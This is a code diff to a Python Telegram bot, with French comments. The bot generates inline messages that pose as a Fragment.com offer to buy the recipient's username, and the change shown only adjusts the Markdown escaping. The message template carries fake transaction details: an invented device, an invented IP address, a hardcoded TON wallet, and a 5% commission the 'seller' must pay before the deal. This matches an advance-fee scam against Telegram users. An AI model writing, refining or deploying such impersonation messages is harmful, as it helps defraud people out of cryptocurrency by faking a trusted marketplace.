@@ -65,22 +65,22 @@ def generate_fragment_message(username, ton_amount):
     # Adresse wallet
     wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
     
-    # Message Fragment avec format markdown complet
-    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
+    # Message Fragment avec format MarkdownV2 (échappement des caractères spéciaux)
+    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment\\.com\\. Below are the transaction details:
 
-**• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)**
-**• Commission: 💎{commission:g} (${commission_usd:.2f} USD)**
+*• Offer Amount: 💎{price:g} \\(${price_usd:.2f} USD\\)*
+*• Commission: 💎{commission:g} \\(${commission_usd:.2f} USD\\)*
 
-Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.
+Please note that a 5% commission is charged to the seller prior to accepting the deal\\. This ensures a secure and efficient transaction process\\.
 
 Additional Information:
 • Device: Safari on macOS  
-• IP Address: 103.56.72.245
-• Wallet: [{wallet_address}](https://tonviewer.com/{wallet_address})
+• IP Address: 103\\.56\\.72\\.245
+• Wallet: [{wallet_address}](https://tonviewer\\.com/{wallet_address})
 
 Important:
-**• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.**
-**• If you choose not to proceed, simply ignore this message.**"""
+*• Please proceed only if you are willing to transform your username into a collectible\\. This action is irreversible\\.*
+*• If you choose not to proceed, simply ignore this message\\.*"""
     
     print(f"✅ Message généré avec format markdown complet (gras + lien)")
     
@@ -148,7 +148,7 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                 description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                 input_message_content=InputTextMessageContent(
                     fragment_message,
-                    parse_mode='Markdown',  # ✅ MARKDOWN POUR TOUT (gras + liens)
+                    parse_mode='MarkdownV2',  # ✅ MARKDOWNV2 PLUS FIABLE
                     disable_web_page_preview=True
                 ),
                 reply_markup=keyboard
